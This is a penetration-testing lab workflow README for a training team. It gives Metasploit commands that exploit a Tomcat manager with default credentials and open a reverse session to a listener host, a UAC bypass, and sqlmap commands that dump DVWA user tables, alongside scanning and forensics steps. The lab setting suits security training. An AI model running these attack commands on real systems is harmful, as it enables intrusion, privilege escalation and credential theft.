# CYART VAPT Team – Week 2 Workflow

## Repository Structure
- **Week 2/**  
  - `VAPT_Lab_Complete.pdf` – Consolidated documentation for Tasks 1–5 (embedded screenshots).  
  - **Notes/** – Lab commands, findings, and remediation notes.  
  - **Workflow/** – Step-by-step methodology and sample commands.

## Workflow Steps

### 1. Reconnaissance
1. **Network discovery:**
nmap -sn 192.168.29.0/24
nmap -sV -sC <target>

2. **Web application enumeration:**
nikto -h http://<target>

### 2. Vulnerability Assessment
1. **Start OpenVAS:**
sudo gvm-start

2. **Create target and task via `gvm-cli`:**
gvm-cli socket --xml "<create_target>…</create_target>"
gvm-cli socket --xml "<create_task>…</create_task>"

3. **Export results:**
gvm-cli socket --xml "<get_reports>…</get_reports>"
| base64 -d > openvas.csv

### 3. Exploitation
1. **Metasploit scanner:**
msfconsole -q
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS <target>; run

2. **Exploit Tomcat manager:**
use exploit/multi/http/tomcat_mgr_upload
set HttpUsername tomcat; set HttpPassword tomcat
set LHOST 192.168.29.146; set LPORT 4444
exploit

### 4. Post-Exploitation
1. **Background session & UAC bypass:**
sessions -l
use exploit/windows/local/bypassuac
set SESSION 1; set LHOST 192.168.29.146; set LPORT 4445
exploit

2. **Memory acquisition & forensics:**
dump_memory
volatility -f memory.dmp --profile=Win7SP1x64 pslist
volatility -f memory.dmp --profile=Win7SP1x64 netscan
volatility -f memory.dmp --profile=Win7SP1x64 dumpfiles
-Q 0xADDR --dump-dir=/tmp/evidence/
sha256sum /tmp/evidence/*.dat > /tmp/evidence/hash.txt

### 5. Full VAPT Cycle
1. **SQLMap on DVWA:**
sqlmap -u "http://<target>/dvwa/vulnerabilities/sqli/?id=1"
--cookie="PHPSESSID=…; security=low" --dbs --batch

2. **Table & data dump:**
sqlmap -D dvwa --tables --batch
sqlmap -D dvwa -T users --dump --batch

3. **Final report in Google Docs and executive summary.**

---